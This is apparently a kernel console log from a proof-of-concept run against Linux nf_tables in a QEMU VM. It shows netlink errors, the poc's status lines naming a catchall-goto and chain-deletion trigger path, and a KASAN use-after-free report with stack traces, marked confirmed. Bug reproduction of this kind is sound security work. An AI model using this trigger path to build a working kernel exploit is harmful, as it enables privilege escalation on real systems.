[nftnl] NLERR seq=352 err=2 (No such file or directory)
[nftnl] NLERR seq=357 err=2 (No such file or directory)
[nftnl] NLERR seq=362 err=2 (No such file or directory)
[nftnl] NLERR seq=367 err=2 (No such file or directory)
[nftnl] NLERR seq=372 err=2 (No such file or directory)
[nftnl] NLERR seq=377 err=2 (No such file or directory)
[nftnl] NLERR seq=382 err=2 (No such file or directory)
[nftnl] NLERR seq=387 err=2 (No such file or directory)
[nftnl] NLERR seq=392 err=2 (No such file or directory)
[nftnl] NLERR seq=397 err=2 (No such file or directory)
[nftnl] NLERR seq=402 err=2 (No such file or directory)
[nftnl] NLERR seq=407 err=2 (No such file or directory)
[nftnl] NLERR seq=412 err=2 (No such file or directory)
[nftnl] NLERR seq=417 err=2 (No such file or directory)
[nftnl] NLERR seq=422 err=2 (No such file or directory)
[nftnl] NLERR seq=427 err=2 (No such file or directory)
[nftnl] NLERR seq=432 err=2 (No such file or directory)
[nftnl] NLERR seq=437 err=2 (No such file or directory)
[nftnl] NLERR seq=442 err=2 (No such file or directory)
[    1.592450] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input2
[    1.593163] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input3
[nftnl] NLERR seq=447 err=2 (No such file or directory)
[nftnl] NLERR seq=452 err=2 (No such file or directory)
[nftnl] NLERR seq=457 err=2 (No such file or directory)
[nftnl] NLERR seq=462 err=2 (No such file or directory)
[nftnl] NLERR seq=467 err=2 (No such file or directory)
[nftnl] NLERR seq=472 err=2 (No such file or directory)
[nftnl] NLERR seq=477 err=2 (No such file or directory)
[nftnl] NLERR seq=482 err=2 (No such file or directory)
[nftnl] NLERR seq=487 err=2 (No such file or directory)
[nftnl] NLERR seq=492 err=2 (No such file or directory)
poc: abort cycle r=96
[nftnl] NLERR seq=497 err=2 (No such file or directory)
[nftnl] NLERR seq=502 err=2 (No such file or directory)
[nftnl] NLERR seq=507 err=2 (No such file or directory)
[nftnl] NLERR seq=512 err=2 (No such file or directory)
[nftnl] NLERR seq=517 err=2 (No such file or directory)
[nftnl] NLERR seq=522 err=2 (No such file or directory)
[nftnl] NLERR seq=527 err=2 (No such file or directory)
[nftnl] NLERR seq=532 err=2 (No such file or directory)
[nftnl] NLERR seq=537 err=2 (No such file or directory)
[nftnl] NLERR seq=542 err=2 (No such file or directory)
[nftnl] NLERR seq=547 err=2 (No such file or directory)
[nftnl] NLERR seq=552 err=2 (No such file or directory)
[nftnl] NLERR seq=557 err=2 (No such file or directory)
[nftnl] NLERR seq=562 err=2 (No such file or directory)
[nftnl] NLERR seq=567 err=2 (No such file or directory)
[nftnl] NLERR seq=572 err=2 (No such file or directory)
[nftnl] NLERR seq=577 err=2 (No such file or directory)
[nftnl] NLERR seq=582 err=2 (No such file or directory)
[nftnl] NLERR seq=587 err=2 (No such file or directory)
[nftnl] NLERR seq=592 err=2 (No such file or directory)
[nftnl] NLERR seq=597 err=2 (No such file or directory)
[nftnl] NLERR seq=602 err=2 (No such file or directory)
[nftnl] NLERR seq=607 err=2 (No such file or directory)
[nftnl] NLERR seq=612 err=2 (No such file or directory)
[nftnl] NLERR seq=617 err=2 (No such file or directory)
[nftnl] NLERR seq=622 err=2 (No such file or directory)
[nftnl] NLERR seq=627 err=2 (No such file or directory)
[nftnl] NLERR seq=632 err=2 (No such file or directory)
[nftnl] NLERR seq=637 err=2 (No such file or directory)
[nftnl] NLERR seq=642 err=2 (No such file or directory)
[nftnl] NLERR seq=647 err=2 (No such file or directory)
poc: DELCHAIN tg errs=0 (0=success means UAF live)
poc: done — expect KASAN UAF in nft_do_chain via catchall goto
[    1.798188] poc (68) used greatest stack depth: 26680 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    1.823218] ==================================================================
[    1.823546] BUG: KASAN: slab-use-after-free in nft_data_release+0xa1/0xd0
[    1.823823] Read of size 4 at addr ffff8880096e7950 by task kworker/u8:2/48
[    1.824092] 
[    1.824162] CPU: 1 UID: 0 PID: 48 Comm: kworker/u8:2 Not tainted 6.19.0-rc7-00131-g7d6ba706ae5e-dirty #1 PREEMPT(voluntary) 
[    1.824164] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.824166] Workqueue: netns cleanup_net
[    1.824169] Call Trace:
[    1.824171]  <TASK>
[    1.824171]  dump_stack_lvl+0x53/0x70
[    1.824175]  print_report+0xce/0x650
[    1.824180]  ? nft_data_release+0xa1/0xd0
[    1.824181]  kasan_report+0xce/0x100
[    1.824183]  ? nft_data_release+0xa1/0xd0
[    1.824184]  nft_data_release+0xa1/0xd0
[    1.824186]  nft_setelem_data_deactivate+0xe0/0x1f0
[    1.824188]  nft_map_deactivate+0x2fc/0x440
[    1.824189]  ? __pfx_nft_map_deactivate+0x10/0x10
[    1.824190]  ? kasan_save_track+0x14/0x30
[    1.824192]  ? __pfx_nft_mapelem_deactivate+0x10/0x10
[    1.824193]  ? kfree+0x136/0x410
[    1.824196]  __nft_release_table+0x7fb/0xe50
[    1.824197]  ? __pfx___nft_release_table+0x10/0x10
[    1.824199]  ? __pfx_mutex_lock+0x10/0x10
[    1.824201]  nf_tables_exit_net+0x2cc/0x5b0
[    1.824203]  ? __pfx_nf_tables_exit_net+0x10/0x10
[    1.824204]  ops_undo_list+0x255/0x700
[    1.824206]  ? __pfx_ops_undo_list+0x10/0x10
[    1.824207]  ? _raw_spin_lock+0x7f/0xd0
[    1.824209]  ? __pfx__raw_spin_lock+0x10/0x10
[    1.824211]  cleanup_net+0x311/0x6c0
[    1.824212]  ? __pfx_cleanup_net+0x10/0x10
[    1.824214]  ? _raw_spin_lock_irq+0x80/0xe0
[    1.824216]  process_one_work+0x5bf/0xfe0
[    1.824219]  worker_thread+0x777/0x13a0
[    1.824220]  ? __kthread_parkme+0x99/0x180
[    1.824222]  ? __pfx_worker_thread+0x10/0x10
[    1.824223]  kthread+0x327/0x630
[    1.824225]  ? __pfx_kthread+0x10/0x10
[    1.824227]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[    1.824229]  ? __pfx_kthread+0x10/0x10
[    1.824230]  ret_from_fork+0x333/0x410
[    1.824232]  ? __pfx_ret_from_fork+0x10/0x10
[    1.824233]  ? __switch_to+0x53a/0xe60
[    1.824236]  ? __pfx_kthread+0x10/0x10
[    1.824237]  ret_from_fork_asm+0x1a/0x30
[    1.824240]  </TASK>
[    1.824241] 
[    1.831545] Allocated by task 68:
[    1.831680]  kasan_save_stack+0x33/0x60
[    1.831838]  kasan_save_track+0x14/0x30
[    1.831997]  __kasan_kmalloc+0x8f/0xa0
[    1.832152]  nf_tables_addchain.constprop.0+0xfa4/0x1d00
[    1.832367]  nf_tables_newchain+0x1c6b/0x2f70
[    1.832546]  nfnetlink_rcv_batch+0x13ea/0x1ee0
[    1.832729]  nfnetlink_rcv+0x2dd/0x360
[    1.832883]  netlink_unicast+0x621/0x890
[    1.833043]  netlink_sendmsg+0x751/0xbf0
[    1.833203]  ____sys_sendmsg+0x823/0xa00
[    1.833364]  ___sys_sendmsg+0xff/0x180
[    1.833518]  __sys_sendmsg+0x11f/0x1b0
[    1.833675]  do_syscall_64+0xa8/0x330
[    1.833827]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.834031] 
[    1.834100] Freed by task 10:
[    1.834228]  kasan_save_stack+0x33/0x60
[    1.834385]  kasan_save_track+0x14/0x30
[    1.834545]  kasan_save_free_info+0x3b/0x60
[    1.834717]  __kasan_slab_free+0x43/0x70
[    1.834878]  kfree+0x136/0x410
[    1.835007]  nf_tables_trans_destroy_work+0xb4c/0xed0
[    1.835211]  process_one_work+0x5bf/0xfe0
[    1.835374]  worker_thread+0x777/0x13a0
[    1.835531]  kthread+0x327/0x630
[    1.835667]  ret_from_fork+0x333/0x410
[    1.835821]  ret_from_fork_asm+0x1a/0x30
[    1.835981] 
[    1.836050] The buggy address belongs to the object at ffff8880096e7900
[    1.836050]  which belongs to the cache kmalloc-128 of size 128
[    1.836536] The buggy address is located 80 bytes inside of
[    1.836536]  freed 128-byte region [ffff8880096e7900, ffff8880096e7980)
[    1.837001] 
[    1.837069] The buggy address belongs to the physical page:
[    1.837287] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x96e7
[    1.837593] flags: 0x100000000000000(node=0|zone=1)
[    1.837789] page_type: f5(slab)
[    1.837922] raw: 0100000000000000 ffff888006041a00 dead000000000122 0000000000000000
[    1.838231] raw: 0000000000000000 0000000000100010 00000000f5000000 0000000000000000
[    1.838539] page dumped because: kasan: bad access detected
[    1.838760] 
[    1.838829] Memory state around the buggy address:
[    1.839022]  ffff8880096e7800: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.839311]  ffff8880096e7880: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.839599] >ffff8880096e7900: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.839888]                                                  ^
[    1.840125]  ffff8880096e7980: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.840413]  ffff8880096e7a00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.840697] ==================================================================
[    1.840991] Disabling lock debugging due to kernel taint
[    1.841217] ------------[ cut here ]------------
[    1.841401] WARNING: ./include/net/netfilter/nf_tables.h:1274 at nft_data_release+0xaf/0xd0, CPU#1: kworker/u8:2/48
[    1.841809] Modules linked in:
[    1.841939] CPU: 1 UID: 0 PID: 48 Comm: kworker/u8:2 Tainted: G    B               6.19.0-rc7-00131-g7d6ba706ae5e-dirty #1 PREEMPT(voluntary) 
[    1.842435] Tainted: [B]=BAD_PAGE
[    1.842572] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.842949] Workqueue: netns cleanup_net
[    1.843114] RIP: 0010:nft_data_release+0xaf/0xd0
[    1.843303] Code: ea 03 0f b6 14 02 48 89 f8 83 e0 07 83 c0 03 38 d0 7c 09 84 d2 74 05 e8 1f 9b 77 fe 8b 43 50 8d 50 ff 89 53 50 85 c0 75 9f 90 <0f> 0b 90 5b c3 cc cc cc cc e8 03 9b 77 fe eb 84 e8 2c 9b 77 fe eb
[    1.844023] RSP: 0018:ffffc9000032f8a0 EFLAGS: 00010246
[    1.844229] RAX: 0000000000000000 RBX: ffff8880096e7900 RCX: ffffffff8136e6a5
[    1.844504] RDX: 00000000ffffffff RSI: 0000000000000008 RDI: ffffffff85cee0a0
[    1.844790] RBP: ffff888009b0d800 R08: 0000000000000001 R09: fffffbfff0b9dc14
[    1.845076] R10: ffffffff85cee0a7 R11: ffffffff85d751a4 R12: 0000000000000014
[    1.845359] R13: 1ffff92000065f1e R14: ffff8880096d8518 R15: 0000000000000002
[    1.845644] FS:  0000000000000000(0000) GS:ffff8880e7675000(0000) knlGS:0000000000000000
[    1.845962] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.846198] CR2: 0000000026ce6730 CR3: 000000000486c003 CR4: 0000000000770ef0
[    1.846481] PKRU: 55555554
[    1.846593] Call Trace:
[    1.846696]  <TASK>
[    1.846786]  nft_setelem_data_deactivate+0xe0/0x1f0
[    1.846984]  nft_map_deactivate+0x2fc/0x440
[    1.847151]  ? __pfx_nft_map_deactivate+0x10/0x10
[    1.847338]  ? kasan_save_track+0x14/0x30
[    1.847500]  ? __pfx_nft_mapelem_deactivate+0x10/0x10
[    1.847702]  ? kfree+0x136/0x410
[    1.847835]  __nft_release_table+0x7fb/0xe50
[    1.848012]  ? __pfx___nft_release_table+0x10/0x10
[    1.848203]  ? __pfx_mutex_lock+0x10/0x10
[    1.848364]  nf_tables_exit_net+0x2cc/0x5b0
[    1.848531]  ? __pfx_nf_tables_exit_net+0x10/0x10
[    1.848721]  ops_undo_list+0x255/0x700
[    1.848873]  ? __pfx_ops_undo_list+0x10/0x10
[    1.849048]  ? _raw_spin_lock+0x7f/0xd0
[    1.849203]  ? __pfx__raw_spin_lock+0x10/0x10
[    1.849379]  cleanup_net+0x311/0x6c0
[    1.849525]  ? __pfx_cleanup_net+0x10/0x10
[    1.849690]  ? _raw_spin_lock_irq+0x80/0xe0
[    1.849859]  process_one_work+0x5bf/0xfe0
[    1.850024]  worker_thread+0x777/0x13a0
[    1.850179]  ? __kthread_parkme+0x99/0x180
[    1.850343]  ? __pfx_worker_thread+0x10/0x10
[    1.850516]  kthread+0x327/0x630
[    1.850651]  ? __pfx_kthread+0x10/0x10
[    1.850803]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[    1.850994]  ? __pfx_kthread+0x10/0x10
[    1.851146]  ret_from_fork+0x333/0x410
[    1.851297]  ? __pfx_ret_from_fork+0x10/0x10
[    1.851468]  ? __switch_to+0x53a/0xe60
[    1.851622]  ? __pfx_kthread+0x10/0x10
[    1.851774]  ret_from_fork_asm+0x1a/0x30
[    1.851932]  </TASK>
[    1.852027] ---[ end trace 0000000000000000 ]---
[    3.079744] ACPI: PM: Preparing to enter system sleep state S5
[    3.080058] reboot: Power down
CONFIRMED: KASAN_UAF
